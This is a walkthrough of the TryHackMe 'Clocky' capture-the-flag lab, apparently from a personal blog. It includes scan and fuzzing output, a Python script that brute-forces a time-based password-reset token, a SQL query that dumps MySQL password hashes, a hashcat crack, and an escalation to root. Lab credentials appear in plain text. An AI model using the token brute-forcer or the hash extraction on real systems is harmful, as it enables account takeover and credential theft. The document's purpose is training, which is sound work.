---
title: TryHackMe Clocky
date: 2024-10-22
tags: [tryhackme, ctf]
author: nandakishor
---
#Clocky
Explore my comprehensive TryHackMe walkthrough on the 'Clocky' CTF challenge, where I dive into key reconnaissance steps, detailed directory enumeration, endpoint analysis, and various exploitation techniques. This guide includes clear screenshots and structured insights to help you follow along and understand each step of the challenge. Perfect for beginners and enthusiasts looking to enhance their cybersecurity skills, my writeup provides practical knowledge and strategic approaches for CTF challenges.
##initial recon

```
┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.10.189.53 -- -sCV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
To scan or not to scan? That is the question.

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.189.53:22
Open 10.10.189.53:80
Open 10.10.189.53:8000
Open 10.10.189.53:8080

PORT     STATE SERVICE    REASON  VERSION
22/tcp   open  ssh        syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d9:42:e0:c0:d0:a9:8a:c3:82:65:ab:1e:5c:9c:0d:ef (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXtxBkvAxfbjN/LEvzTuFBgqM7tUh9QnFzAf5VDnVfx2cfhYSLlNM3WN+b1OBJjFnQb+/8S+Qloc24ZvCHlJctfYKfh/Dt9JfSgCQH/sPGUxeYnJbQ/fqw9aqiZZ1zKEKd33q0jl5vfRJx2u6L7s8MPZ5pbFYtJ6DwKc9jws0NqbabYwC3UlMhgVsYA6pwpilMNkad61n8XqIE4GOmuWKi9zcYPRtoV6ALhffG8HwR7OJgFjShPlC1ishKwazBUWrzgsdk+caj7GVjC8QDgReY3zCZ5Q4h/TRAjTeg5ZON6dgDB/94lIrynSMU6HVwTvc/KmPkUjPnFBBy1ofd41+PDJeRidqyyNk1byIo7SVZKvVzPNdfbXVk6PUwlIl6jJHA/TUSpa5H/0iqLoYrAlup15Pm9gltyoxYyqOvokP6GFBtbqUGAebSDk9RkZRqP777FsEVP4FuMho+9S0ylv8C4MWPDN36bSmHG5i17A9bkNObeDizMFLQcEMRdHWFrzk=
|   256 ff:b6:27:d5:8f:80:2a:87:67:25:ef:93:a0:6b:5b:59 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL3b5mTMniOjphOsd9Y9FB7sf2Sdhfr3/LSuVgjkPBZjEWdBDO4HaEzKKZyFTYcNYxlYguEa+19iatmpSe0mmdU=
|   256 e1:2f:4a:f5:6d:f1:c4:bc:89:78:29:72:0c:ec:32:d2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBllTG5b4CG1OPzkyPgaXHZW3JZN9UbxT94Yp8cMIu9F
80/tcp   open  http       syn-ack Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: 403 Forbidden
8000/tcp open  http       syn-ack nginx 1.18.0 (Ubuntu)
|_http-title: 403 Forbidden
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST
8080/tcp open  http-proxy syn-ack Werkzeug/2.2.3 Python/3.8.10
|_http-title: Clocky
|_http-server-header: Werkzeug/2.2.3 Python/3.8.10
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.3 Python/3.8.10
|     Date: Tue, 22 Oct 2024 15:20:12 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 6206
|     Connection: close
|     <head>
|     <style>
.......
```

Then website is empty,
I used ffuf to scan for directories , and i found `robots.txt`

```
┌──(kali㉿kali)-[~]
└─$ ffuf -u http://clocky.thm:8000/FUZZ -w /usr/share/wordlists/dirb/common.txt                  

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.0
________________________________________________

 :: Method           : GET
 :: URL              : http://clocky.thm:8000/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

                        [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 218ms]
robots.txt              [Status: 200, Size: 115, Words: 7, Lines: 7, Duration: 224ms]
:: Progress: [4614/4614] :: Job [1/1] :: 186 req/sec :: Duration: [0:01:22] :: Errors: 80 ::
```

Got the first flag
![alt text](<../assets/images/clocky/Screenshot 2024-10-22 205635.png>)

##flag2
We have 3 extensions here , so we can search for files with those extensions

```
Disallow: /*.sql$
Disallow: /*.zip$
Disallow: /*.bak$
```
I used ffuf to do this

```
──(kali㉿kali)-[~]
└─$ ffuf -u http://clocky.thm:8000/FUZZ.zip -w /usr/share/wordlists/dirb/common.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.0
________________________________________________

 :: Method           : GET
 :: URL              : http://clocky.thm:8000/FUZZ.zip
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

index                   [Status: 200, Size: 1922, Words: 6, Lines: 11, Duration: 220ms]
```
we have index.zip so download the file

```
                                                                                                                     
┌──(kali㉿kali)-[~/tmp]
└─$ file index.zip 
index.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
                                                                                                                     
┌──(kali㉿kali)-[~/tmp]
└─$ unzip index.zip 
Archive:  index.zip
  inflating: app.py                  
 extracting: flag2.txt               
                                                                                                                     
┌──(kali㉿kali)-[~/tmp]
└─$ cat flag2.txt                                               
THM{1d3d62de34a3[boom]8d03ec474159eaf}
```
Got the second flag

##flag3


![alt text](<../assets/images/clocky/Screenshot 2024-10-22 210540.png>)

```
┌──(kali㉿kali)-[~]
└─$ ffuf -u http://clocky.thm:8080/FUZZ -w /usr/share/wordlists/dirb/big.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.0
________________________________________________

 :: Method           : GET
 :: URL              : http://clocky.thm:8080/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

administrator           [Status: 200, Size: 1609, Words: 669, Lines: 54, Duration: 213ms]
dashboard               [Status: 302, Size: 215, Words: 18, Lines: 6, Duration: 214ms]
forgot_password         [Status: 200, Size: 1516, Words: 647, Lines: 53, Duration: 312ms]
```
found three directories

![alt text](<../assets/images/clocky/Screenshot 2024-10-22 210705.png>)
![alt text](<../assets/images/clocky/Screenshot 2024-10-22 210820.png>)

Look at the source code of app.py that we downloaded


![alt text](<../assets/images/clocky/Screenshot 2024-10-22 211001.png>)

###User Information and Comments
The comments reveal two usernames: 

* jane: Appears in comments on multiple endpoints (e.g., "/").

* clarice: Is mentioned in a comment in the /password_reset endpoint.

###Database Information

* The comment "Execute database.sql before using this" implies that the application relies on a MySQL database schema defined in a SQL script named database.sql.

Credentials for connecting to the database:
* The connection string shows it connects to MySQL as the user clocky_user with a password retrieved from environment variables (db).

###Key Endpoints and Their Behavior

/administrator Endpoint:

Handles the login functionality. When a POST request is made, it:
Queries the users table for the username.
Retrieves the corresponding ID.
Validates the password from the passwords table using the fetched ID.
After a successful login, users are redirected to the /dashboard endpoint.

/forgot_password Endpoint:

This endpoint generates a password reset token when provided a username. The process:
Queries the users table for the existence of the username.
Generates a reset token using the current time and username, which is hashed using SHA-1.
Updates the token in the reset_token table.
This mechanism presents a vulnerability, as it uses predictable values (the current time and username) to generate the token.

/password_reset Endpoint:

This endpoint verifies whether the user-provided token matches the one stored in the reset_token table.
It only works if the TEMPORARY parameter is passed in the GET request.

```
import datetime
import hashlib
import requests
import urllib3

# Disable SSL warnings since 'verify=False' is used
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Given details for brute-forcing the token
given_time_str = "2024-10-23 04:11:08"
username = "administrator"
base_url = "http://10.10.127.180:8080/password_reset?token="

# Convert the given time string into a datetime object
given_time = datetime.datetime.strptime(given_time_str, "%Y-%m-%d %H:%M:%S")

# Brute-forcing the milliseconds
for ms in range(100):
    ms_str = f"{ms:02}"  # Format milliseconds to always have two digits
    time_with_ms = given_time.strftime("%Y-%m-%d %H:%M:%S.") + ms_str
    
    # Combine the time and username to generate the token string
    lnk = time_with_ms + " . " + username.upper()
    token = hashlib.sha1(lnk.encode("utf-8")).hexdigest()

    # Send the request with the generated token
    response = requests.get(base_url + token, verify=False)
    
    # Check if the response does not contain "Invalid token"
    if "<h2>Invalid token</h2>" not in response.text:
        print(f"Valid Token Found: {token}")
        print(f"Response: {response.text}\n")
        break  # Stop after finding the valid token
    else:
        print(f"Tried Token: {token} - Invalid")
```
use this payload to get the valid token
Before executing it change the ip address and the time

![alt text](<../assets/images/clocky/Screenshot 2024-10-23 094331.png>)

This is the date and time you need to change in the payload

![alt text](<../assets/images/clocky/Screenshot 2024-10-23 094517.png>)

use this token to change the password, 


![alt text](<../assets/images/clocky/Screenshot 2024-10-23 094602.png>)

![alt text](<../assets/images/clocky/Screenshot 2024-10-23 094707.webp>)

##flag4
![alt text](<../assets/images/clocky/Screenshot 2024-10-23 095812.png>)
 
it is CSRF exploitable

![alt text](<../assets/images/clocky/Screenshot 2024-10-23 095950.png>)

we want the flag4 , we can use path traversal to find some files

![alt text](<../assets/images/clocky/Screenshot 2024-10-23 100833.png>)

i found some intersting file s that we can get , but first we need to bypass the url, i used burp to do this,

and the final answer is
![alt text](<../assets/images/clocky/Screenshot 2024-10-23 101047.png>)

##flag 5
![alt text](<../assets/images/clocky/Screenshot 2024-10-23 101547.png>)

we have a username and a password that we got from the database file

use ssh to login

```
                                                                                                                     
┌──(kali㉿kali)-[~/tmp]
└─$ ssh clarice@10.10.127.180
The authenticity of host '10.10.127.180 (10.10.127.180)' can't be established.
ED25519 key fingerprint is SHA256:vnov3QU45drV6QHH7EaLHkEmEqAi7YqLURLhQ/HvRqU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.127.180' (ED25519) to the list of known hosts.
clarice@10.10.127.180's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-165-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 23 Oct 2024 04:47:36 AM UTC

  System load:  0.0               Processes:             117
  Usage of /:   59.8% of 8.02GB   Users logged in:       0
  Memory usage: 62%               IPv4 address for eth0: 10.10.127.180
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

clarice@clocky:~$ 

```

get the flag5

```
clarice@clocky:~$ head -c 8 flag5.txt
THM{e57dclarice@clocky:~$ 
```
##flag6

Locatet the app file
```
clarice@clocky:~/app$ cat .env
db=seG3mY4F3tKCJ1Yj
clarice@clocky:~/app$ 
```
its probably a db password

```
clarice@clocky:~/app$ cat .env
db=seG3mY4F3tKCJ1Yj
clarice@clocky:~/app$ mysql -u clocky_user -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 9
Server version: 8.0.34-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

For further information
```
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| clocky             |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.01 sec)

```
```
Database changed
mysql> show tables;
+------------------------------------------------------+
| Tables_in_mysql                                      |
+------------------------------------------------------+
| columns_priv                                         |
| component                                            |
| db                                                   |
| default_roles                                        |
| engine_cost                                          |
| func                                                 |
| general_log                                          |
| global_grants                                        |
| gtid_executed                                        |
| help_category                                        |
| help_keyword                                         |
| help_relation                                        |
| help_topic                                           |
| innodb_index_stats                                   |
| innodb_table_stats                                   |
| password_history                                     |
| plugin                                               |
| procs_priv                                           |
| proxies_priv                                         |
| replication_asynchronous_connection_failover         |
| replication_asynchronous_connection_failover_managed |
| replication_group_configuration_version              |
| replication_group_member_actions                     |
| role_edges                                           |
| server_cost                                          |
| servers                                              |
| slave_master_info                                    |
| slave_relay_log_info                                 |
| slave_worker_info                                    |
| slow_log                                             |
| tables_priv                                          |
| time_zone                                            |
| time_zone_leap_second                                |
| time_zone_name                                       |
| time_zone_transition                                 |
| time_zone_transition_type                            |
| user                                                 |
+------------------------------------------------------+
37 rows in set (0.00 sec)

mysql> 
```
```
mysql> select user,host,plugin from mysql.user;
+------------------+-----------+-----------------------+
| user             | host      | plugin                |
+------------------+-----------+-----------------------+
| clocky_user      | %         | caching_sha2_password |
| dev              | %         | caching_sha2_password |
| clocky_user      | localhost | caching_sha2_password |
| debian-sys-maint | localhost | caching_sha2_password |
| dev              | localhost | caching_sha2_password |
| mysql.infoschema | localhost | caching_sha2_password |
| mysql.session    | localhost | caching_sha2_password |
| mysql.sys        | localhost | caching_sha2_password |
| root             | localhost | auth_socket           |
+------------------+-----------+-----------------------+
9 rows in set (0.00 sec)

mysql> 
```
```
mysql> select user,host,plugin from user where user="dev";
+------+-----------+-----------------------+
| user | host      | plugin                |
+------+-----------+-----------------------+
| dev  | %         | caching_sha2_password |
| dev  | localhost | caching_sha2_password |
+------+-----------+-----------------------+
2 rows in set (0.00 sec)

mysql> 
```
```
mysql> SELECT user, CONCAT('$mysql',LEFT(authentication_string,6),'*',INSERT(HEX(SUBSTR(authentication_string,8)),41,0,'*')) AS hash FROM user WHERE plugin = 'caching_sha2_password' AND authentication_string NOT LIKE '%INVALIDSALTANDPASSWORD%';
+------------------+----------------------------------------------------------------------------------------------------------------------------------------------+
| user             | hash                                                                                                                                         |
+------------------+----------------------------------------------------------------------------------------------------------------------------------------------+
| clocky_user      | $mysql$A$005*077E1B6B675D350F435D5D1C686D12566C08635A*5566386F49543936423756525A68516962735568536535654B62486D344C71316B7338707A78446B4E4D39 |
| dev              | $mysql$A$005*0D172F787569054E322523067049563540383D17*6F31786178584431332F4D6830726C6C6F652F5771636D6D6142444D46367237776A764647676F54536142 |
| clocky_user      | $mysql$A$005*63671A7C5C3E425E3A0C794352306B531456162B*58774E44786D326C44443557334A39353531676A6C566D4F5A395A39684832537A61696C786D32566B4C2E |
| debian-sys-maint | $mysql$A$005*456268331A4E3561236636480E4D3F78462A7553*716A4E6262555947697444712F79464C4D384C62617544683833517472615161455479366E5A5774576332 |
| dev              | $mysql$A$005*1C160A38777C5121134E5D725A58216D5A1D5C3F*6F6B2F577851456465524C4E6771587057456634734A6F6E5A656361774655697A4438466F6B654935462E |
+------------------+----------------------------------------------------------------------------------------------------------------------------------------------+
5 rows in set (0.00 sec)

mysql> 
```
crack the hash

```
└─$ hashcat hash                                          
hashcat (v6.2.6) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-sandybridge-AMD Ryzen 7 4800H with Radeon Graphics, 1041/2147 MB (512 MB allocatable), 4MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

7401 | MySQL $A$ (sha256crypt) | Database Server
```

```
┌──(kali㉿kali)-[~]
└─$ hashcat -m 7401 hash /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting
```
```
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 7401 (MySQL $A$ (sha256crypt))
Hash.Target......: $mysql$A$005*0D172F787569054E322523067049563540383D...536142
Time.Started.....: Wed Oct 23 10:33:56 2024 (1 min, 3 secs)
Time.Estimated...: Wed Oct 23 10:34:59 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      799 H/s (7.81ms) @ Accel:32 Loops:256 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 50048/14344385 (0.35%)
Rejected.........: 0/50048 (0.00%)
Restore.Point....: 49920/14344385 (0.35%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4864-5000
Candidate.Engine.: Device Generator
Candidates.#1....: bobocel -> IMISSYOU
Hardware.Mon.#1..: Util: 81%

Started: Wed Oct 23 10:33:55 2024
Stopped: Wed Oct 23 10:35:00 2024
```

```
$mysql$A$005*0D172F787569054E322523067049563540383D17*6F31786178584431332F4D6830726C6C6F652F5771636D6D6142444D46367237776A764647676F54536142:armadillo
```


Get that flag
```
clarice@clocky:~$ su root
Password: 
root@clocky:/home/clarice# cd /root
root@clocky:~# ls
flag6.txt  snap
root@clocky:~# 
```
